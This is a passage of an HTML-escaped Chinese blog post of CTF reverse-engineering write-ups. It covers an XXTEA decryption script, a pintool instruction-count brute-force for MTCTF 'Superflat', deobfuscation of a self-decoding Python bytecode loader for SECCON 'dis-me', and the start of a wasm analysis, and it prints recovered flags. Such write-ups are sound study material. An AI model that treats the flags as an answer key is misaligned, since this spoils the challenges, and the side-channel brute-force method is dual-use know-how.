&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;是一个 xxtea，用 switch 来判断使用哪个 key，round 是 12，所以直接用脚本解密就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DELTA 0x67452301  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MX (((z&amp;gt;&amp;gt;5^y&amp;lt;&amp;lt;2) + (y&amp;gt;&amp;gt;3^z&amp;lt;&amp;lt;4)) ^ ((sum^y) + (key[(p&amp;amp;3)^e] ^ z)))  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;btea&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; key[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])  
{  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; y, z, sum;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; p, rounds, e;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)            &lt;span style=&#34;color:#75715e&#34;&gt;/* Coding Part */&lt;/span&gt;  
    {  
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No use&amp;#34;&lt;/span&gt;);
    }  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)      &lt;span style=&#34;color:#75715e&#34;&gt;/* Decoding Part */&lt;/span&gt;  
    {  
        n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;n;  
        &lt;span style=&#34;color:#75715e&#34;&gt;// rounds = 6 + 52/n; 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        rounds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;; 
        sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rounds&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DELTA;  
        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];  
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;  
        {  
            e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;  
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; p&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;)  
            {  
                z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];  
                y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[p] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; MX;  
            }  
            z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];  
            y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; MX;  
            sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; DELTA;  
        }  
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;rounds);  
    }  
}  

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()  
{  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        &lt;span style=&#34;color:#ae81ff&#34;&gt;3640088821u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1382566363u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;3805750627u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1214181292u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1620003782u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1482291050u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;2956289443u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1044419009u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;3554368410u&lt;/span&gt;,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;0u&lt;/span&gt;
    };
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0xEFCDAB89u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10325476u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98BADCFEu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3D2E1F0u&lt;/span&gt;};  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;//n的绝对值表示v的长度，取正表示加密，取负表示解密  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// v为要加密的数据是两个32位无符号整数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    btea(v, n, k);   
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;  
}  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;mtctf-4thsuperflat&#34;&gt;[MTCTF 4th]Superflat&lt;/h2&gt;
&lt;p&gt;这个题用了 movfuscator，正好前段时间有人在群里提过，一下就想起来了&lt;/p&gt;
&lt;p&gt;但要解混淆需要装一个 demov 的工具，配置环境有点复杂&lt;/p&gt;
&lt;p&gt;考虑到这个程序中没有任何的动态链接过程，而且能看到两个函数名 &lt;code&gt;getchar&lt;/code&gt; 和 &lt;code&gt;putchar&lt;/code&gt;，那大胆猜测是按照每一位来判断的，可以考虑上 pintools&lt;/p&gt;
&lt;p&gt;先手动测试了一下，发现对于同样的输入，执行的指令数字完全相同，并且每正确一位会增加 4888 条指令，于是根据 pintools 这个工具自己写个爆破脚本&lt;/p&gt;
&lt;p&gt;在爆破前看了一下 output 文件，发现总长度是42位，于是直接猜测 flag 格式为 &lt;code&gt;flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}&lt;/code&gt; 其中 x 为 [0-9a-f] （小写字母是手动爆破了第一位确定的）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess

password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{d06f0bcc-xxxxxxxxxxxxxxxxxxxxxxxxxxx}&amp;#34;&lt;/span&gt;

cur_pos &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;
last_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;693225&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; cur_pos &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(password) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0123456789abcdef-&amp;#34;&lt;/span&gt;:
        command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; password[:cur_pos] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; password[cur_pos&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; | ./pin-3.18-98332-gaebd7b1e6-gcc-linux/pin -t ./pin-3.18-98332-gaebd7b1e6-gcc-linux/source/tools/ManualExamples/obj-ia32/inscount0.so -- ./superflat; cat inscount.out&amp;#34;&lt;/span&gt;
        output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check_output(command, shell&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, stderr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE)
        count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; count &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; last_count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (i)
            password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; password[:cur_pos] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; password[cur_pos &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]
            cur_pos &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
            last_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; count
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;error:&amp;#34;&lt;/span&gt;, cur_pos)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{d06f0bcc-93e0-9c5b-161e-e1464176d395}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一次在比赛中用上 pintool，纪念一下&lt;/p&gt;
&lt;h2 id=&#34;secconctf-2021dis-me&#34;&gt;[SECCONCTF 2021]dis-me&lt;/h2&gt;
&lt;p&gt;python 逆向，一上线就被叫来做这题了（属于是把 python 题目包场了）&lt;/p&gt;
&lt;p&gt;先自己看了眼字节码，然后判断了一下，删了一些东西，再 pycdc 反编译，同时结合着自己的分析，拿到了反编译结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; marshal
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; types
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(__file__, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seek(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;)
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; marshal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:]
types&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FunctionType(marshal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(bytes([((y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate((s[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; : &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]]))]))), globals())()
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; s
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; f
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; marshal
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; base64
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; types
&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;读取了自身文件，然后偏移改到了 12，就是跳过了文件头，直接从 &lt;code&gt;E3 00 00 00&lt;/code&gt; 开始，是 &lt;code&gt;marshal&lt;/code&gt; 的正确格式（但自己写的时候有一些问题，不太懂了）&lt;/p&gt;
&lt;p&gt;接下来 &lt;code&gt;.co_code[4:]&lt;/code&gt; 猜测是取了代码段，并从下标为 4 的地方开始取&lt;/p&gt;
&lt;p&gt;&lt;code&gt;s[2 : 2 + s[0] * 256 + s[1]]&lt;/code&gt;：接下来根据取出数据的前两位来判断接下来取出数据的总长度，并且跳过了前两位&lt;/p&gt;
&lt;p&gt;于是最终取出的数据为 &lt;code&gt;0x2C&lt;/code&gt; 开始的数据，一直取到 &lt;code&gt;64 00 64 01&lt;/code&gt; 这个正确程序的开头部分&lt;/p&gt;
&lt;p&gt;types 那一行里面的 &lt;code&gt;bytes([((y - x * 7 - 45) % 256) for x, y in enumerate((s[2 : 2 + s[0] * 256 + s[1]]))])&lt;/code&gt; 一开始并没有分析出来，主要是位置不确定，于是自己拿数据试了试可能的几个方案，发现这样可以得到 base64的结果，就说明是这个了&lt;/p&gt;
&lt;p&gt;将 base64 的结果解码到文件，然后补全文件头后 uncompyle6 反编译，得到正确的流程&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; n: n &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; (f(n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f(n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Input the flag &amp;gt; &amp;#39;&lt;/span&gt;)
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SECCON{&amp;#39;&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;endswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(flag) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;:
            s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sum(abs(ord(c) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; ord(str(f(i)))) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]))
    s &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Correct! The flag is&amp;#39;&lt;/span&gt;, flag)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wrong :(&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;直接把 &lt;code&gt;str(f(i))&lt;/code&gt; 跑一遍就拿到 flag 了（斐波那契）&lt;/p&gt;
&lt;h2 id=&#34;secconctf-2021flag&#34;&gt;[SECCONCTF 2021]flag&lt;/h2&gt;
&lt;p&gt;这道题是个 wasm 逆向，人生第一次做出来，值得纪念&lt;/p&gt;
&lt;p&gt;先从网站上把 wasm 文件下载下来&lt;/p&gt;
&lt;p&gt;第一步肯定是 wasm2c 一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;./wasm2c 0001d242.wasm -o out.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来进行编译&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;g++ -c out.c -o out.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用 ida 打开，发现一个叫 check 的函数，到网站的 js 里面动调到 check，可以获取加载的数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;check&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NekoPunch&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6dbf84f73cf6a112268b09525ea550a665e21cb2e3e13af7e3ea0ecb52f5b9cda5b6522b1e978734553f1d7956d4af94bfc3f4d68c8fba9eeecf4035550b9106f70d57d1a6cdaf3211eaaa78d71a9038b71be621241e8b608a43b107f8860f543ab0189aa063800de4bae7d0b11045b8&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是看一下 check 函数就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_g0;
  i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)w2c_g0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40LL&lt;/span&gt;, a1);
  &lt;span style=&#34;color:#75715e&#34;&gt;// 省略
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40LL&lt;/span&gt;);
  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40LL&lt;/span&gt;);
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_f25(v8) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  v52 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_f21(v7, v9);
